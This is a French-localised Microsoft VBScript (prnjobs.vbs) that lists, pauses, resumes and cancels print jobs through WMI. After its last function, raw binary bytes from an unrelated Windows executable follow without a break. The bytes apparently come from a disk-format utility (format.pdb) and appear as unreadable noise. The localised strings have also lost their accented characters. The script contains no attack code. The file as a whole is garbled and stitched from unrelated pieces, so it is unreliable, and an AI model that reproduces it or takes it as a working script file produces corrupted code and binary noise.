' Copyright (c) Microsoft Corporation. All rights reserved.
'
' Abstract:
' prnjobs.vbs - job control script for WMI on Whistler
'     used to pause, resume, cancel and list jobs
'
' Usage:
' prnjobs [-zmxl?] [-s server] [-p printer] [-j jobid] [-u user name] [-w password]
'
' Examples:
' prnjobs -z -j jobid -p printer
' prnjobs -l -p printer
'
'----------------------------------------------------------------------

option explicit

'
' Debugging trace flags, to enable debug output trace message
' change gDebugFlag to true.
'
const kDebugTrace = 1
const kDebugError = 2
dim   gDebugFlag

gDebugFlag = false

'
' Operation action values.
'
const kActionUnknown    = 0
const kActionPause      = 1
const kActionResume     = 2
const kActionCancel     = 3
const kActionList       = 4

const kErrorSuccess     = 0
const KErrorFailure     = 1

const kNameSpace        = "root\cimv2"

'
' Generic strings
'
const L_Empty_Text                 = ""
const L_Space_Text                 = " "
const L_Error_Text                 = "Erreur"
const L_Success_Text               = "Russi"
const L_Failed_Text                = "chec"
const L_Hex_Text                   = "0x"
const L_Printer_Text               = "Imprimante"
const L_Operation_Text             = "Opration"
const L_Provider_Text              = "Fournisseur"
const L_Description_Text           = "Description"
const L_Debug_Text                 = "dboguer:"

'
' General usage messages
'                                 
const L_Help_Help_General01_Text   = "Utilisation : prnjobs [-zmxl?] [-s serveur][-p imprimante][-j ID_tche][-u nom_utilisateur][-w mot_passe]" 
const L_Help_Help_General02_Text   = "Arguments:"
const L_Help_Help_General03_Text   = "-j     - identificateur de la tche"
const L_Help_Help_General04_Text   = "-l     - liste toutes les tches"
const L_Help_Help_General05_Text   = "-m     - ractive la tche interrompue"
const L_Help_Help_General06_Text   = "-p     - nom de l'imprimante"
const L_Help_Help_General07_Text   = "-s     - nom du serveur"
const L_Help_Help_General08_Text   = "-u     - nom_utilisateur"
const L_Help_Help_General09_Text   = "-w     - mot_passe"
const L_Help_Help_General10_Text   = "-x     - annule la tche"
const L_Help_Help_General11_Text   = "-u     - interrompt la tche"
const L_Help_Help_General12_Text   = "-?     - affiche l'utilisation de la commande"
const L_Help_Help_General13_Text   = "Exemples:"
const L_Help_Help_General14_Text   = "prnjobs -z -p imprimante -j id_tche"
const L_Help_Help_General15_Text   = "prnjobs -l -p imprimante"
const L_Help_Help_General16_Text   = "prnjobs -l"

'
' Messages to be displayed if the scripting host is not cscript
'                            
const L_Help_Help_Host01_Text      = "Excutez ce script avec CScript."  
const L_Help_Help_Host02_Text      = "Ceci peut se faire en :"
const L_Help_Help_Host03_Text      = "1. entrant ""CScript script.vbs arguments"", ou" 
const L_Help_Help_Host04_Text      = "2. changeant l'hte de script Windows par dfaut pour CScript"
const L_Help_Help_Host05_Text      = "   en entrant ""CScript //H:CScript //S"", puis en lanant le script "
const L_Help_Help_Host06_Text      = "   ""arguments script.vbs""."

'
' General error messages
'                                                 
const L_Text_Error_General01_Text  = "Impossible de reconnatre le langage de script."                
const L_Text_Error_General02_Text  = "Impossible d'analyser la ligne de commande." 
const L_Text_Error_General03_Text  = "Code derreur Win32"

'
' Miscellaneous messages
'
const L_Text_Msg_General01_Text    = "Impossible d'numrer les tches d'impression"
const L_Text_Msg_General02_Text    = "Nombre de tches d'impression numres"
const L_Text_Msg_General03_Text    = "Impossible de dfinir la tche d'impression"
const L_Text_Msg_General04_Text    = "Impossible d'obtenir l'objet SWbemLocator"
const L_Text_Msg_General05_Text    = "Impossible de se connecter au service WMI"


'
' Print job properties
'
const L_Text_Msg_Job01_Text        = "ID de travail"
const L_Text_Msg_Job02_Text        = "Imprimante"
const L_Text_Msg_Job03_Text        = "Document"
const L_Text_Msg_Job04_Text        = "Type de donnes"
const L_Text_Msg_Job05_Text        = "Nom du pilote"
const L_Text_Msg_Job06_Text        = "Description"
const L_Text_Msg_Job07_Text        = "Temps coul"
const L_Text_Msg_Job08_Text        = "Nom de l'ordinateur :"
const L_Text_Msg_Job09_Text        = "tat du travail"
const L_Text_Msg_Job10_Text        = "Avertir"
const L_Text_Msg_Job11_Text        = "Propritaire"
const L_Text_Msg_Job12_Text        = "Pages imprimes"
const L_Text_Msg_Job13_Text        = "Paramtres"
const L_Text_Msg_Job14_Text        = "Taille"
const L_Text_Msg_Job15_Text        = "Heure de dbut"
const L_Text_Msg_Job16_Text        = "Jusqu lheure"
const L_Text_Msg_Job17_Text        = "tat"
const L_Text_Msg_Job18_Text        = "Masque d'tat"
const L_Text_Msg_Job19_Text        = "Heure denvoi"
const L_Text_Msg_Job20_Text        = "Nombre de pages"

'
' Action strings
'
const L_Text_Action_General01_Text = "Suspendre"
const L_Text_Action_General02_Text = "Reprendre"
const L_Text_Action_General03_Text = "Annuler"

'
' Debug messages
'
const L_Text_Dbg_Msg01_Text        = "Dans la fonction ListJobs"
const L_Text_Dbg_Msg02_Text        = "Dans la fonction ExecJob"
const L_Text_Dbg_Msg03_Text        = "Dans la fonction ParseCommandLine"

main

'
' Main execution starts here
'
sub main

    dim iAction
    dim iRetval
    dim strServer
    dim strPrinter
    dim strJob
    dim strUser
    dim strPassword
    
    '
    ' Abort if the host is not cscript
    '
    if not IsHostCscript() then
   
        call wscript.echo(L_Help_Help_Host01_Text & vbCRLF & L_Help_Help_Host02_Text & vbCRLF & _
                          L_Help_Help_Host03_Text & vbCRLF & L_Help_Help_Host04_Text & vbCRLF & _
                          L_Help_Help_Host05_Text & vbCRLF & L_Help_Help_Host06_Text & vbCRLF)
        
        wscript.quit
   
    end if

    iRetval = ParseCommandLine(iAction, strServer, strPrinter, strJob, strUser, strPassword)

    if iRetval = kErrorSuccess then

        select case iAction

            case kActionPause
                 iRetval = ExecJob(strServer, strJob, strPrinter, strUser, strPassword, L_Text_Action_General01_Text)

            case kActionResume
                 iRetval = ExecJob(strServer, strJob, strPrinter, strUser, strPassword, L_Text_Action_General02_Text)

            case kActionCancel
                 iRetval = ExecJob(strServer, strJob, strPrinter, strUser, strPassword, L_Text_Action_General03_Text)

            case kActionList
                 iRetval = ListJobs(strServer, strPrinter, strUser, strPassword)

            case else
                 Usage(true)
                 exit sub

        end select

    end if

end sub

'
' Enumerate all print jobs on a printer
'
function ListJobs(strServer, strPrinter, strUser, strPassword)
    
    on error resume next
    
    DebugPrint kDebugTrace, L_Text_Dbg_Msg01_Text

    dim Jobs
    dim oJob
    dim oService
    dim iRetval
    dim strTemp
    dim iTotal
    
    if WmiConnect(strServer, kNameSpace, strUser, strPassword, oService) then
        
        set Jobs = oService.InstancesOf("Win32_PrintJob")

    else
    
        ListJobs = kErrorFailure
        
        exit function        
    
    end if
    
    if Err.Number <> kErrorSuccess then         
    
        wscript.echo L_Text_Msg_General01_Text & L_Space_Text & L_Error_Text & L_Space_Text _
                     & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description

        ListJobs = kErrorFailure
            
        exit function
        
    end if
    
    iTotal = 0
    
    for each oJob in Jobs
        
        '
        ' oJob.Name has the form "printer name, job id". We are isolating the printer name
        '                              
        strTemp = Mid(oJob.Name, 1, InStr(1, oJob.Name, ",", 1)-1 )

        '
        ' If no printer was specified, then enumerate all jobs
        '
        if strPrinter = null or strPrinter = "" or LCase(strTemp) = LCase(strPrinter) then

            iTotal = iTotal + 1
        
            wscript.echo L_Empty_Text
            wscript.echo L_Text_Msg_Job01_Text & L_Space_Text & oJob.JobId
            wscript.echo L_Text_Msg_Job02_Text & L_Space_Text & strTemp
            wscript.echo L_Text_Msg_Job03_Text & L_Space_Text & oJob.Document
            wscript.echo L_Text_Msg_Job04_Text & L_Space_Text & oJob.DataType
            wscript.echo L_Text_Msg_Job05_Text & L_Space_Text & oJob.DriverName
            wscript.echo L_Text_Msg_Job06_Text & L_Space_Text & oJob.Description
            wscript.echo L_Text_Msg_Job07_Text & L_Space_Text & Mid(CStr(oJob.ElapsedTime), 9, 2) & ":" _
                                                              & Mid(CStr(oJob.ElapsedTime), 11, 2) & ":" _
                                                              & Mid(CStr(oJob.ElapsedTime), 13, 2)
            wscript.echo L_Text_Msg_Job08_Text & L_Space_Text & oJob.HostPrintQueue
            wscript.echo L_Text_Msg_Job09_Text & L_Space_Text & oJob.JobStatus
            wscript.echo L_Text_Msg_Job10_Text & L_Space_Text & oJob.Notify
            wscript.echo L_Text_Msg_Job11_Text & L_Space_Text & oJob.Owner
            wscript.echo L_Text_Msg_Job12_Text & L_Space_Text & oJob.PagesPrinted
            wscript.echo L_Text_Msg_Job13_Text & L_Space_Text & oJob.Parameters
            wscript.echo L_Text_Msg_Job14_Text & L_Space_Text & oJob.Size

            if CStr(oJob.StartTime) <> "********000000.000000+000" and _ 
               CStr(oJob.UntilTime) <> "********000000.000000+000" then

                wscript.echo L_Text_Msg_Job15_Text & L_Space_Text & Mid(Mid(CStr(oJob.StartTime), 9, 4), 1, 2) & "h" _
                                                                  & Mid(Mid(CStr(oJob.StartTime), 9, 4), 3, 2) 
                wscript.echo L_Text_Msg_Job16_Text & L_Space_Text & Mid(Mid(CStr(oJob.UntilTime), 9, 4), 1, 2) & "h" _ 
                                                                  & Mid(Mid(CStr(oJob.UntilTime), 9, 4), 3, 2) 
            end if

            wscript.echo L_Text_Msg_Job17_Text & L_Space_Text & oJob.Status
            wscript.echo L_Text_Msg_Job18_Text & L_Space_Text & oJob.StatusMask
            wscript.echo L_Text_Msg_Job19_Text & L_Space_Text & Mid(CStr(oJob.TimeSubmitted), 5, 2) & "/" _
                                                              & Mid(CStr(oJob.TimeSubmitted), 7, 2) & "/" _
                                                              & Mid(CStr(oJob.TimeSubmitted), 1, 4) & " " _
                                                              & Mid(CStr(oJob.TimeSubmitted), 9, 2) & ":" _
                                                              & Mid(CStr(oJob.TimeSubmitted), 11, 2) & ":" _
                                                              & Mid(CStr(oJob.TimeSubmitted), 13, 2)
            wscript.echo L_Text_Msg_Job20_Text & L_Space_Text & oJob.TotalPages
                
            Err.Clear
           
        end if        
                         
    next

    wscript.echo L_Empty_Text
    wscript.echo L_Text_Msg_General02_Text & L_Space_Text & iTotal 
    
    ListJobs = kErrorSuccess

end function

'
' Pause/Resume/Cancel jobs
'
function ExecJob(strServer, strJob, strPrinter, strUser, strPassword, strCommand)

    on error resume next

    DebugPrint kDebugTrace, L_Text_Dbg_Msg02_Text

    dim oJob
    dim oService
    dim iRetval
    dim uResult
    dim strName

    '
    ' Build up the key. The key for print jobs is "printer-name, job-id"
    '                                  
    strName = strPrinter & ", " & strJob

    iRetval = kErrorFailure
    
    if WmiConnect(strServer, kNameSpace, strUser, strPassword, oService) then
        
        set oJob = oService.Get("Win32_PrintJob.Name='" & strName & "'")
    
    else
    
        ExecJob = kErrorFailure
        
        exit function        
    
    end if

    '
    ' Check if getting job instance succeeded
    '
    if Err.Number = kErrorSuccess then
    
        uResult = kErrorSuccess                      
                              
        select case strCommand
        
            case L_Text_Action_General01_Text
                 uResult = oJob.Pause()
                 
            case L_Text_Action_General02_Text
                 uResult = oJob.Resume()
                 
            case L_Text_Action_General03_Text
                 oJob.Delete_()          
                 
             case else
                 Usage(true)
                 
        end select

        if Err.Number = kErrorSuccess then

            if uResult = kErrorSuccess then                     
            
                wscript.echo L_Success_Text & L_Space_Text & strCommand & L_Space_Text _
                             & L_Text_Msg_Job01_Text & L_Space_Text & strJob _
                             & L_Space_Text & L_Printer_Text & L_Space_Text & strPrinter
        
                iRetval = kErrorSuccess
                
            else
            
                wscript.echo L_Failed_Text & L_Space_Text & strCommand & L_Space_Text _ 
                             & L_Text_Error_General03_Text & L_Space_Text & uResult 
            
            end if    

        else

            wscript.echo L_Text_Msg_General03_Text & L_Space_Text & L_Error_Text & L_Space_Text _
                         & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description
                         
            '
            ' Try getting extended error information
            '
            call LastError()             
            
        end if
         
   else      
        
        wscript.echo L_Text_Msg_General03_Text & L_Space_Text & L_Error_Text & L_Space_Text _ 
                     & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description
        
        '
        ' Try getting extended error information
        '
        call LastError()
        
    end if
    
    ExecJob = iRetval
    
end function

'
' Debug display helper function
'
sub DebugPrint(uFlags, strString)

    if gDebugFlag = true then

        if uFlags = kDebugTrace then

            wscript.echo L_Debug_Text & L_Space_Text & strString

        end if

        if uFlags = kDebugError then

            if Err <> 0 then

                wscript.echo L_Debug_Text & L_Space_Text & strString & L_Space_Text _
                             & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) _
                             & L_Space_Text & Err.Description

            end if

        end if

    end if

end sub

'
' Parse the command line into its components
'
function ParseCommandLine(iAction, strServer, strPrinter, strJob, strUser, strPassword)

    on error resume next

    DebugPrint kDebugTrace, L_Text_Dbg_Msg03_Text

    dim oArgs
    dim iIndex

    iAction = kActionUnknown
    iIndex = 0

    set oArgs = wscript.Arguments

    while iIndex < oArgs.Count

        select case oArgs(iIndex)

            case "-z"
                iAction = kActionPause

            case "-m"
                iAction = kActionResume

            case "-x"
                iAction = kActionCancel

            case "-l"
                iAction = kActionList

            case "-p"
                iIndex = iIndex + 1
                strPrinter = oArgs(iIndex)
                
            case "-s"
                iIndex = iIndex + 1
                strServer = RemoveBackslashes(oArgs(iIndex))

            case "-j"
                iIndex = iIndex + 1
                strJob = oArgs(iIndex)
                
            case "-u"
                iIndex = iIndex + 1
                strUser = oArgs(iIndex)
                
            case "-w"
                iIndex = iIndex + 1
                strPassword = oArgs(iIndex)        
            
            case "-?"
                Usage(true)
                exit function

            case else
                Usage(true)
                exit function

        end select

        iIndex = iIndex + 1

    wend

    if Err.Number = kErrorSuccess then

        ParseCommandLine = kErrorSuccess

    else
    
        wscript.echo L_Text_Error_General02_Text & L_Space_Text & L_Error_Text & L_Space_Text _
                     & L_Hex_Text & hex(Err.Number) & L_Space_text & Err.Description
        
        ParseCommandLine = kErrorFailure
    
    end if
        
end function

'
' Display command usage.
'
sub Usage(bExit)

    wscript.echo L_Help_Help_General01_Text
    wscript.echo L_Empty_Text
    wscript.echo L_Help_Help_General02_Text
    wscript.echo L_Help_Help_General03_Text
    wscript.echo L_Help_Help_General04_Text
    wscript.echo L_Help_Help_General05_Text
    wscript.echo L_Help_Help_General06_Text
    wscript.echo L_Help_Help_General07_Text
    wscript.echo L_Help_Help_General08_Text
    wscript.echo L_Help_Help_General09_Text
    wscript.echo L_Help_Help_General10_Text
    wscript.echo L_Help_Help_General11_Text
    wscript.echo L_Help_Help_General12_Text
    wscript.echo L_Empty_Text
    wscript.echo L_Help_Help_General13_Text
    wscript.echo L_Help_Help_General14_Text
    wscript.echo L_Help_Help_General15_Text
    wscript.echo L_Help_Help_General16_Text

    if bExit then

        wscript.quit(1)

    end if

end sub

'
' Determines which program is being used to run this script. 
' Returns true if the script host is cscript.exe
'
function IsHostCscript()

    on error resume next
    
    dim strFullName 
    dim strCommand 
    dim i, j 
    dim bReturn
    
    bReturn = false
    
    strFullName = WScript.FullName
    
    i = InStr(1, strFullName, ".exe", 1)
    
    if i <> 0 then
        
        j = InStrRev(strFullName, "\", i, 1)
        
        if j <> 0 then
            
            strCommand = Mid(strFullName, j+1, i-j-1)
            
            if LCase(strCommand) = "cscript" then
            
                bReturn = true  
            
            end if    
                
        end if
        
    end if
    
    if Err <> 0 then
    
        wscript.echo L_Text_Error_General01_Text & L_Space_Text & L_Error_Text & L_Space_Text _
                     & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description 
        
    end if
    
    IsHostCscript = bReturn

end function

'
' Retrieves extended information about the last error that occured 
' during a WBEM operation. The methods that set an SWbemLastError
' object are GetObject, PutInstance, DeleteInstance
'
sub LastError()

    on error resume next

    dim oError

    set oError = CreateObject("WbemScripting.SWbemLastError")
   
    if Err = kErrorSuccess then
   
        wscript.echo L_Operation_Text            & L_Space_Text & oError.Operation
        wscript.echo L_Provider_Text             & L_Space_Text & oError.ProviderName
        wscript.echo L_Description_Text          & L_Space_Text & oError.Description
        wscript.echo L_Text_Error_General03_Text & L_Space_Text & oError.StatusCode
                
    end if                                                             
                                                             
end sub

'
' Connects to the WMI service on a server. oService is returned as a service
' object (SWbemServices)
'
function WmiConnect(strServer, strNameSpace, strUser, strPassword, oService)

    on error resume next

    dim oLocator
    dim bResult
   
    oService = null
   
    bResult  = false
   
    set oLocator = CreateObject("WbemScripting.SWbemLocator")

    if Err = kErrorSuccess then

        set oService = oLocator.ConnectServer(strServer, strNameSpace, strUser, strPassword)

        if Err = kErrorSuccess then

            bResult = true
      
            oService.Security_.impersonationlevel = 3
  
            '
            ' Required to perform administrative tasks on the spooler service
            '
            oService.Security_.Privileges.AddAsString "SeLoadDriverPrivilege"
          
            Err.Clear
      
        else

            wscript.echo L_Text_Msg_General05_Text & L_Space_Text & L_Error_Text _
                         & L_Space_Text & L_Hex_Text & hex(Err.Number) & L_Space_Text _
                         & Err.Description
            
        end if
   
    else
   
        wscript.echo L_Text_Msg_General04_Text & L_Space_Text & L_Error_Text _
                     & L_Space_Text & L_Hex_Text & hex(Err.Number) & L_Space_Text _
                     & Err.Description
         
    end if                                                         
   
    WmiConnect = bResult
            
end function

'
' Remove leading "\\" from server name
'
function RemoveBackslashes(strServer)

    dim strRet
    
    strRet = strServer
    
    if Left(strServer, 2) = "\\" and Len(strServer) > 2 then 
   
        strRet = Mid(strServer, 3) 
        
    end if   

    RemoveBackslashes = strRet

end function


  MZ                @                                       	!L!This program cannot be run in DOS mode.
$       ƩuAAFADAEA{AARich                        PE  L RH         
 j         g                                  6                              j  x                                                                @   X  h                                .text    i      j                    `.data   P          n              @  .rsrc            p              @  @H0   ^H;   LHH       Q   ^H]           msvcrt.dll KERNEL32.dll ulib.dll ifsutil.dll ntdll.dll                                                                                                                                                                                                                                                                                                                                  |ހ||||.|||I|1|j>|    Rx  x  x  x  w  w  w  hw  (w  v  v  v  u  fv  4v  x      gMΞMOM\M|SMMM#MMgMM8M~MM-MMlM     |    ;q#1qqKq)qr;qc2qs0q0qq`qM;qA)qqqrqqqq+qgqq7qqq-qqqqq%q+q&qp&q'q&q<q/q\+q9qY&qEq9qqqqRqG&qqG*q        RH       #   H  H	      %s  %W  /?  /fs:*   /t:*    /n:*    /8  /4  /1  /a:256k /a:128k /a:64k  /a:32k  /a:16k  /a:8192 /a:4096 /a:2048 /a:1024 /a:512  /f:20.8MB   /f:20.8M    /f:20.8 /f:2.88MB   /f:2.88M    /f:2.88 /f:2880KB   /f:2880K    /f:2880 /f:1.44MB   /f:1.44M    /f:1.44 /f:1440KB   /f:1440K    /f:1440 /f:1MB  /f:1M   /f:1    /f:1.25MB   /f:1.25M    /f:1.25 /f:1250KB   /f:1250K    /f:1250 /f:360KB    /f:360K /f:360  /f:320KB    /f:320K /f:320  /f:256KB    /f:256K /f:256  /f:180KB    /f:180K /f:180  /f:160KB    /f:160K /f:160  /f:1.23MB   /f:1.23M    /f:1.23 /f:1.2MB    /f:1.2M /f:1.2  /f:1232KB   /f:1232K    /f:1232 /f:1200KB   /f:1200K    /f:1200 /f:720KB    /f:720K /f:720  /f:640KB    /f:640K /f:640  /x  /y  /backup /v:*    /v:""   /force  /c  /q  /u  /v  *   %s%W    FORMAT  %d%d    %d  FormatEx    U   NTFS    FAT32   FAT RAW HPFS    h h     H                                                           $ p    RSDS2
 I
CO	   format.pdb      j                   Ud   u@0j p ]̋U0  $ ESVWEE$EdE8E4E(E DE$0E(E,E0E4,E8 E<  5 ֍֋ 3P@TL<H Q  j,n;Ƌ= Yt׉TT9T  j0[S<;Ƌ5 Yt։(( (   SYt։  u  SYt ll l F  SYt։    SYt։    S[Yt։    S0Yt։    SYt։  o  SYt։  D  SYt։xx x   j,Yt׉    SX3;Yt։PP9P  S-;Yt։dd9d  S;Yt։HH9Hp  S;Yt։\\9\G  S;Yt։@@9@  S;Yt։tt9t  S`;Yt։8898  S7;Yt։0090  S;Yt։,,9,z  S;Yt։9Q  S;Yt։9(  S;Yt։9  Sj;Yt։DD9D  SA;Yt։9  S;Yt։<<9<  S;Yt։9[  S;Yt։92  S;Yt։  9 	  St;Yt։9  SK;Yt։9  S";Yt։9  S;Yt։9e  S;Yt։9<  S;Yt։9  S~;Yt։$$9$   SU;Yt։4494   S,;Yt։9   S;Yt։pp9ptsS;Yt։hh9htNS;Yt։``9`t)S;Yt։XX9X
      2ۋ5 ֍֍  M_^[/H  8   j,=
  	;Ƌ= Yt׉TT9Toj0[S;Ƌ5 Yt։(( ( ;SYt։  S{Yt ll l SLYt։  S!Yt։  SYt։  `SYt։  5SYt։  
SuYt։  SJYt։xx x j,Yt׉  S3;Yt։9]S;Yt։94S;Yt։9Sv;Yt։9SM;Yt։9S$;Yt։9S;Yt։PP9PgS;Yt։@@9@>S;Yt։9S;Yt։9SW;Yt։9S.;Yt։9S;Yt։9qS;Yt։9HS;Yt։9S;Yt։PP9PSa;Yt։dd9dS8;Yt։HH9HS;Yt։9{S;Yt։9RS;Yt։9)S;Yt։9 Sk;Yt։9SB;Yt։  9 S;Yt։\\9\S;Yt։@@9@\S;Yt։tt9t3S;Yt։8898
Su;Yt։0090SL;Yt։,,9,S#;Yt։DD9DS;Yt։9fS;Yt։<<9<=S;Yt։TT9TS;Yt։LL9LSV;Yt։<<9<S-;Yt։HH9HS;Yt։9pS;Yt։9GS;Yt։9S;Yt։9S`;Yt։9S7;YA  ։8  9S;YA  ։8  9lS;YA  ։8  9<S;YA  ։$8  494Sw;YA  ։8  p9pSG;YA  ։h8  `9`S;Yt։XX9Xj0[3S;Y  ։X
  ;Ƌ= Yt׉TT9T2j0[S5 Yt։(( ( SiYt։  S>Yt ll l SYt։  ySYt։  NSYt։  #SYt։  ScYt։  S8Yt։  SYt։xx x wj,Yt׉  KS3;Yt։9 S;Yt։9Sb;Yt։9S9;Yt։9S;Yt։9|S;Yt։9SS;Yt։9*S;Yt։9Sl;Yt։9SC;Yt։9S;Yt։9S;Yt։9]S;Yt։PP9P4S;Yt։dd9dSv;Yt։HH9HSM;Yt։9S$;Yt։9S;Yt։9gS;Yt։9>S;Yt։9S;Yt։  9 SW;Yt։\\9\S.;Yt։@@9@S;Yt։tt9tqS;Yt։8898HS;Yt։0090S;Yt։,,9,Sa;Yt։DD9DS8;Yt։9S;Yt։<<9<9jS;Y։9:S;Y։9
Su;Y։$9$SE;Y։49S;Y։ph9hzS;Y։`X9XJS;Yt։``9`!S;Yt։||9|Sc;Yt։tt9tS:;Yt։ll9lS;Yt։9}S;Yt։hh9hTS;Yt։pp9p+S;Yt։9Sm;Yt։  9 SD;Yt։9S;Yt։||9|S;Yt։\\9\^S;Yt։95S;Yt։9j,v= 3;Yt׉xx9xj,D;Yt׉9j,;Yt 9j0;Yt։LL9LX5 jj2ք>jj2ք*P S< S@     TD  Wӄ(5H h քh քlj WL vh քah քLh ք7h ք"hx ӄhp քhl քxhh քPh` քdhX քHhL ք\hD քz@h< քeth0 քP8h( ք;0h ք&,h քh քh քh քDh քh ք<h քh ք~h քi h     T W	  D +(5H h քh քlSWL h քh քh քh քD hx ӄvhp քahl քLxhh ք7h ք"h քh քh քh քh| քPht ք@hl քh` քzhX քehP քPhD ք;h< ք&h4 քh( քPh` քdhX քHhL ք\hD ք@h< քth0 ք~8h( քi0h քT,h ք?Dh ք*h ք<h ք Th  քLh ք<h քHh  քh քh քh քmh քXh քCh ք.h քh քh քh քh ք$h ք4h| քhp քphh քqhh\ ք\`hP քGXhH ք2Xh< ք`h0 ք|h( քth  քlh քh քhh քph  քh քu h ք`h քK|h ք6\h ք!h քh ք=P xh ׄh ׄh ӄLh քT5T ք(քkքUlWք>ք(քքքքքքxքքxքbքLք6ք ք
|քtքlքքhքpքքp քZքD|ք.xքքքLSքPX   jj h  P\ Vh W tj` iD [(5H h ք@h ք+lSWL h ք h քh քh քD hx ӄhp քhl ք|xhh քgh քRh ք=h ք(h քh քh| քhX քhP քhD քh< քh4 քh( քkPh` քVdhX քAHhL ք,h քh քh քh քh ք h ք\hD ք@h< քth0 քo8h( քZ0h քE,h ք0Dh քh ք<h {, t%4  `   d W
  h  w(PPdl 3;	  ~	  	  jWh  	  9	  p 5t 8jW   dք	  dp Y x =d ׄtVx, tJjj h  Ph h V       EPdׄux, u2(d =| 4jt@(j Ph ׄtd jtW@(Dj PքQwӃ YuBjj h  P Ph Dh ׄ@,, x@,@,0P,z, t @,d t;, t5jj h  Ph V YY    W|3!3F8B,t   Ƌtz, t   @lz, t   @z, t   @hz, t    @pz, t @  @z, t   @ z, t   @z, t   @|z, t   @;v)jj h  Ph V YYS  t!ƅ  ƅ ƅ| ƅL    x, ux, ux, ƅ  tƅ x, ux, ux, ƅ tƅx, ux, ux, ƅ| tƅ|x, ux, ux, ƅL tƅL  ӄt-Px, u@x, ux, t	ƅƅ Px, udx, uHx, ƅd tƅd ӄtxTx,    Lx,    <x,    Hx,    x, u{x, uox, ucx, uWBx, uCx, u7x, u+x, ux, u x, ƅ tƅ\x, u@x, utx, ƅ tƅ8x, uC0x, u7,x, u+Dx, ux, u<x, ƅ tƅx, uCx, u7x, u+x, ux, ux, ƅ tƅ$x, uC4x, u7x, u+px, uhx, u`x, ƅ tƅXx, uXx, u`x, ƅD tƅD\@,t6y, t, u	ƅkty, u, t	ƅ RF  y, t, u	ƅL5)  8A,u8G,t	ƅ|  8A,  8G,  xd   d    C(u:G((uƅ|   Muƅ   P   ƅd   	u%G((uƅL   Pumƅ   u(PuVƅ   u(Pu?ƅ   $u(Pu(ƅn  t{(u	ƅOjj h  Ph W YY   d    d    dDL| $  u0` ` jj h  Ph W YY0jj h  jj h  Ph V YY     x pjj h  Ph V YY`     /̋UuEuRP$  MQ] ̋Uuuuu;  MQ] ̋   tt2̋USVuWjj h  P=  SV׋YYjj h  PSV׋YYjj h  PSVYY  ujj h  PSVYYjj h  PSV׋YYjj h  PSV׋YYjj h  PSV׋YYjj h  PSV׋YYjj h"  PSV׋YYjj h  PSV׋YYjj h  PSV׋YYjj h  PSVYY  _^[] ̋UU32@8Mt	E
   8Mt	E	   8M4t	E4   8Mt	E   8Mt	E   8M8t	E8   8M t	E    8M$tE$8M<t	E<   8M(t	E(   8M,t	E,   8M0t	E0   MVuuuu u$u(u,u0u4u8u<;~%ujj h  Ph V YY2u!
^]8 ̋U  $ SVW4E8 5 x֍`֍֍֍֍֍֍֍֍֍`֍H֍3ۍh ֍x֍֍ ֍H(֋ ƅ$4 S0 P, P4( uj[  5| j WxքtލPPPP PPPPPP`PxPP4P;ua  8t)8ƅujWք>ƅjh ք t YYujSh2    5 j։xP$ ֋+Ë5   X  HHF  P  tt YYu#4jSh  4P4WPYYPxP< C=| jh ׄ&jh ׄjh `ׄjh Hׄ=l 84 u9  um8ue4jSh  4P`P4h P֋4jSh  4P4h P֋4YY4P(j SSS4PP80 7  9 u
ǅ$   0;#  4;Ӌ~9t409|9u})t#Htt	tHu"jjX(jjjtHtHt3jj3@;Ӊ~)09t409| ;u ;Éu88 ;É-
  8Tj PPPP@ 	    Yu-9upPt YY
  8Bu8EtU9upPt YY	  8Bt 	  8j	  4jSh  4PP4h Pփ8t=9upPt YY	      	  jh  |   9ujSPt u   Pt ut YYuIt YYu`8A	  jSPt   4jS4h  PP4h Pփht YYu!jh |   P  f  jh H| K  (PHP P ;É3  B  j 8   SxP    8PP ;Étypt YYtd4jSh  4P`P4h PփP44Ppt YY   9tj8uG4jSh  4P`P4h P֋4S4Ps  ;   e $e 8jSth  p:Ë44th  eh	  ^8jSth  @:Ë44th  5h  .8jSth  :th  h
  44Pe $e h      h      h      h@     hh     h     j   j,   jXj   jj   QQ    XP8D 80H P0p0@PBp00PZ@0Qh  4h Pփ)  tjjj4h Pփ h   [;YtL   tBu9880H H90v88H HP88H P @;  0uk8uc9$   8H t   u   ;   Sj4PPP    E  tot YYtWSj4PPP WjQQĉXT WjQQĈXX         9$   8\ 8H ;tcSj4PPP 0tBWjQQĉXT WjQQĈXX 09tjj 38ƅɁ   ɃɃ؍# P4PP   ( 8?  83  jS4  P4P4h P֋4YYS4P    8l 0jSh  44P4h PYY83C   8"  4j4Suh  P4h PYY h  P`P4h Pփ qjSh  EBjS  P*jSh  jSh  4jSh  4P9uP4h PփjSh  jSh&  4jSh  4PPh 4h PփjSh  s 4jSh  4P4h PYY3CS8'  8j!4jSh  4P4h PYY  8tbh   v;YtL 3Sj4PPP tWjQQċΉXX ;tj (   8l H  8l 8   SPd    4jSh)  4PP4h P֋4j4PtBPh j44Su
h+     h*  P4h PYY8tyP` uhjSh  <jSh$  jSh  44P4WP 3C(jSh  44P43h PCYY5 H֍ ֍֍x֍֍x ֍H֍`֍֍֍֍֍֍֍֍֍`֍x֍4 M   _^[a [ i[ [   a J\ Q\ X\ a\ @\ 6\ ,\ \ \ j\ \ \ "\   	






